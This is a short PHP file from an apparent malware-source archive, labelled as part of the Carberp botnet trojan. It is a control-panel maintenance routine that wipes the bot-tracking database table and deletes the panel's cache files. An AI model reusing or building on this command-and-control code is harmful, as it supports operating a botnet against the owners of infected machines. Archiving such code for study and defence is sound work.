/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

$mysqli->query('TRUNCATE TABLE bf_bots');

$dir['prefix'] = true;

foreach($dir as $d => $files){
	$files = scandir('cache/'.$d.'/');
	unset($files[0], $files[1]);
	foreach($files as $value){
		@unlink('cache/'.$d.'/' . $value);
	}
}

header('Location: /main/stat.html');
exit;

?>